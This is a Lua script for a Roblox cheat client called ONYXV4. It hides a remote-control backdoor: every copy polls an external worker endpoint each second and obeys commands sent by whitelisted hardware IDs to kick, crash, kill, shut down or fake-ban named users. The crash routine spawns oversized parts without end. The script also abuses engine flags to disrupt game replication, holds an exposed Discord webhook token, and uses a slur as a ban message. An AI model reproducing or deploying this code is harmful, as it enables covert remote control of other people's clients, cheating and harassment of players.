local run = function(func)
	task.spawn(function()
		func()
	end)
end
local cloneref = cloneref or function(obj) return obj end
local Players = cloneref(game:GetService("Players"))
local HttpService = cloneref(game:GetService("HttpService"))
local playersService = cloneref(game:GetService('Players'))
local replicatedStorage = cloneref(game:GetService('ReplicatedStorage'))
local runService = cloneref(game:GetService('RunService'))
local inputService = cloneref(game:GetService('UserInputService'))
local tweenService = cloneref(game:GetService('TweenService'))
local lightingService = cloneref(game:GetService('Lighting'))
local marketplaceService = cloneref(game:GetService('MarketplaceService'))
local teleportService = cloneref(game:GetService('TeleportService'))
local httpService = cloneref(game:GetService('HttpService'))
local guiService = cloneref(game:GetService('GuiService'))
local groupService = cloneref(game:GetService('GroupService'))
local textChatService = cloneref(game:GetService('TextChatService'))
local contextService = cloneref(game:GetService('ContextActionService'))
local coreGui = cloneref(game:GetService('CoreGui'))

local lplr = Players.LocalPlayer
--local webhook = "https://discord.com/api/webhooks/1464359024928620607/Q-CubcghJAo2XRl7omJY62_-eZHCbI0c2f2WgZgqOkeRK2zrDLvB4vlAPzEWDpEZcwoW"
local vape = shared.vape
local rblxsite = 'https://www.roblox.com/users/'..lplr.UserId
local fisishsiterlbx = rblxsite..'/profile?friendshipSourceType=PlayerSearch'
local date = os.date("%d-%m-%Y")

local s1 = {
    content = lplr.Name
        .. " has injected ONYXV4 at "
        .. date
        .. " in the gameid "
        .. game.PlaceId
		.. " | "
		.. fisishsiterlbx
}

local req = request or http_request or syn.request

local api = "https://whitelistcommandsclient.fsl58.workers.dev/whitelist"
local str = readfile("ReVape/accounts/hwid.txt")
if str == nil then
	str = ''
end
run(function()
    if isfile("ReVape/accounts/hwid.txt") then 
        if str == "ablznckx-hfc0-42qv-9a8n-6p8qs37f8r42" or str == "bb7b84bc-c308-46eb-add6-473c07c2ab32" or str == "FC6C9E9F-8998-4CC2-BF98-5F20161FEB71" or str == "3C86E748-45F6-4B15-9719-62EFD287E34E" or str == "7a73ce6e-5b73-4f82-bf43-4127505b78cd" or str == "28dc335-ccb9-4671-9141-bd01a9e03902" or str == "mz5hivii-t3vk-4yxn-8y6b-9raxs9grke3p" or str == "c2e2c7e9-899d-401c-9f8e-a8b51a4b8c76" or str == "xwxjehth-ipyk-49je-8xpq-4q4okuue7waq" then
            run(function()
                local PositionRaper
                PositionRaper = vape.Categories.Blatant:CreateModule({
                    Name = "PositionRaper",
                    Function = function(callback)
                        if callback then
                            task.spawn(function()
                                repeat
                                    setfflag('DFIntDebugDefaultTargetWorldStepsPerFrame', '-2147483648')
                                    setfflag('DFIntMaxMissedWorldStepsRemembered', '-2147483648')
                                    setfflag('DFIntWorldStepsOffsetAdjustRate', '2147483648')
                                    setfflag('DFIntDebugSendDistInSteps', '-2147483648')
                                    setfflag('DFIntWorldStepMax', '-2147483648')
                                    setfflag('DFIntWarpFactor', '2147483648')
                                    task.wait()
                                until not PositionRaper.Enabled
                            end)
                            setfflag('NextGenReplicatorEnabledWrite4', 'true')
                        else
                            setfflag('NextGenReplicatorEnabledWrite4', 'false')
                        end
                    end
                })
            end)
            run(function()
                local FalseBan
                local user
                FalseBan = vape.Legit:CreateModule({
                    Name = "FalseBan",
                    Tooltip = "FalseBan anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        FalseBan:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'faggot',
                            type = "ban"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = FalseBan:CreateTextBox({
                    Name = "Username"
                })

            end)
            run(function()
                local Kick
                local user
                local msg
                Kick = vape.Legit:CreateModule({
                    Name = "Kick",
                    Tooltip = "Kicks anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        Kick:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = msg.Value,
                            type = "kick"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = Kick:CreateTextBox({
                    Name = "Username"
                })
                msg = Kick:CreateTextBox({
                    Name = "Message"
                })
           end)
           run(function()
                local Crash
                local user
                Crash = vape.Legit:CreateModule({
                    Name = "Crash",
                    Tooltip = "Crashes anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        Crash:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'nothing',
                            type = "crash"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = Crash:CreateTextBox({
                    Name = "Username"
                })
           end)
           run(function()
                local Void
                local user
                Void = vape.Legit:CreateModule({
                    Name = "Void",
                    Tooltip = "Voids anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        Void:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'nothing',
                            type = "void"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = Void:CreateTextBox({
                    Name = "Username"
                })
           end)
           run(function()
                local Kill
                local user
                Kill = vape.Legit:CreateModule({
                    Name = "Kill",
                    Tooltip = "Kills anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        Kill:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'nothing',
                            type = "kill"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = Kill:CreateTextBox({
                    Name = "Username"
                })
           end)
           run(function()
                local SD
                local user
                SD = vape.Legit:CreateModule({
                    Name = "Shutdown",
                    Tooltip = "Shutdowns anyone using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        SD:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'nothing',
                            type = "shutdown"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = SD:CreateTextBox({
                    Name = "Username"
                })
           end)
           run(function()
                local Fly
                local user
                Fly = vape.Legit:CreateModule({
                    Name = "Fly",
                    Tooltip = "makes anyone flying by using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        Fly:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = 'nothing',
                            type = "fly"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = Fly:CreateTextBox({
                    Name = "Username"
                })
           end)
           run(function()
                local FPS
                local user
                local msg
                FPS = vape.Legit:CreateModule({
                    Name = "Framerate",
                    Tooltip = "makes anyone FPS thast using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        FPS:Toggle(false)
                        local s2 = {
                            hwid = str,
                            plr = user.Value,
                            msg = msg.Value,
                            type = "fps"
                        }
                        req({
                            Url = api,
                            Method = "POST",
                            Headers = {
                                ["Content-Type"] = "application/json"
                            },
                            Body = HttpService:JSONEncode(s2)
                        })
                    end
                })
                user = FPS:CreateTextBox({
                    Name = "Username"
                })
                msg = FPS:CreateTextBox({
                    Name = "FPS"
                })
           end)
           run(function()
                local GetUsers
                GetUsers = vape.Legit:CreateModule({
                    Name = "GetUsers",
                    Tooltip = "gets anyone whos using ONYX! via by the cloud",
                    Function = function(callback)
                        if not callback then
                            return
                        end
                        GetUsers:Toggle(false)
                        date = os.date("%d-%m-%Y")

                        local s1 = {
                            content = lplr.Name
                                .. " has injected ONYXV4 at "
                                .. date
                                .. " in the gameid "
                                .. game.PlaceId
                                .. " | "
                                .. fisishsiterlbx
                        }

                        local req = request or http_request or syn.request

                    end
                })
           end)
        end
    end
end)

run(function()
    while task.wait(1) do
        local success, response = pcall(function()
            return game:HttpGet(api .. "?t=" .. os.clock())
        end)
        if not success or not response then
            
        end
        local decoded
        local ok = pcall(function()
            decoded = HttpService:JSONDecode(response)
        end)
        if not ok or not decoded or not decoded.maincontrol then
            
        end
        local str = decoded.maincontrol.plr
        local msg = decoded.maincontrol.msg
        local command = decoded.maincontrol.type
        if lplr.Name == str and command == "kick" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
			task.wait(0.2)
			lplr:Kick(msg)
        end
        if lplr.Name == str and command == "crash" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
			task.wait(0.2)
			task.spawn(function()
                local SpikeTickThreshold = 0.3
                local current = 0
                repeat
                    local new = tick()
                    local delta = (new - current)
                    if delta >= SpikeTickThreshold then
                        local Part = Instance.new("Part")
                        Part.Size = Vector3.new(1e10,1e10,1e10)
                        Part.Parent = workspace
                        Part.Anchored = true
                    end
                    local Part = Instance.new("Part")
                    Part.Size = Vector3.new(1e8,1e8,1e8)
                    Part.Parent = workspace
                    Part.Anchored = true
                    current = new
                until false
            end)
        end
        if lplr.Name == str and command == "void" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            if lplr.Character then
                lplr.Character.HumanoidRootPart.CFrame += Vector3.new(0, -1000, 0)
            else
                lplr.CharacterAdded:Wait()
                task.wait(0.025)
                lplr.Character.HumanoidRootPart.CFrame += Vector3.new(0, -1000, 0)
            end

        end
        if lplr.Name == str and command == "kill" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            if lplr.Character then
                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                lplr.Character.Humanoid.Health = 0
            else
                lplr.CharacterAdded:Wait()
                task.wait(0.025)
                lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Dead)
                lplr.Character.Humanoid.Health = 0
            end
        end
        if lplr.Name == str and command == "shutdown" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            game:Shutdown()
        end
        if lplr.Name == str and command == "fly" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            if lplr.Character then
                if vape.Modules then
                    if vape.Modules.Fly then
                        if not vape.Modules.Fly.Enabled then
                            vape.Modules.Fly:Toggle(true)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            vape.Modules.Fly:Toggle(false)
                        end
                    end
                end
            else
                lplr.CharacterAdded:Wait()
                task.wait(0.025)
                if vape.Modules then
                    if vape.Modules.Fly then
                        if not vape.Modules.Fly.Enabled then
                            vape.Modules.Fly:Toggle(true)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            task.wait(0.1)
                            lplr.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
                            vape.Modules.Fly:Toggle(false)
                        end
                    end
                end
            end
        end
        if lplr.Name == str and command == "fps" then
            req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            local newfps = tonumber(msg)
            if newfps == nil then
                newfps = 60
            end
            setfpscap(newfps)
        end
        if lplr.Name == str and command == "ban" then
           req({
                Url = api,
                Method = "DELETE",
                Headers = {
                    ["Content-Type"] = "application/json"
                }
            })
            task.wait(0.2)
            pcall(function()
                if textChatService.ChatVersion == Enum.ChatVersion.TextChatService then
                    local textChannel = textChatService.TextChannels:FindFirstChild("RBXGeneral")
                    if textChannel then
                        textChannel:DisplaySystemMessage("<font color='#FF0000'>A cheater in this server has been banned</font>")
                    end
                end
            end)
            pcall(function()
                cloneref(game:GetService("StarterGui")):SetCore("ChatMakeSystemMessage", {
                    Text = "A cheater in this server has been banned",
                    Color = Color3.fromRGB(255, 0, 0),
                    Font = Enum.Font.SourceSansBold,
                    FontSize = Enum.FontSize.Size18
                })
            end)
            lplr:Kick("You have been temporarily banned. (Remaining ban duration: 4960 weeks 2 days 4 hour 34 minutes 6 seconds)")
        end
    end
end)

run(function()
	local Users = {1,142823291}
	for i, v in Users do
        if lplr.UserId == v then
            local rngtime = math.random(3,5)
            local special = Random.new():NextNumber(1,5)
            local delta = (rngtime - special + 1 - math.random())
            if delta >= 0 then
                delta = math.random(3,5) - math.random()
            end
            local n = tostring(delta)
            local dot = string.find(n, "%.")
            if dot then
                n = string.sub(n, 1, dot + 3)
            end
            delta = tonumber(n)
            vape:CreateNotification("Onyx",`You are blacklisted. Uninjecting in {delta}s...`,delta,"alert")
            task.wait(delta)
			if vape.ThreadFix then
				setthreadidentity(8)
			end
            vape:Uninject()
		 	date = os.date("%d-%m-%Y")
			local s1 = {
			    content = lplr.Name
			        .. " has tried to inject ONYXV4 while being BLACKLISTED "
			        .. date
			        .. " in the gameid "
			        .. game.PlaceId
			        .. " | "
			        .. fisishsiterlbx
			        .. " | uninjected in "
			        .. tostring(delta) .. " seconds",
			}

            local req = request or http_request or syn.request

          
        end
	end
end)
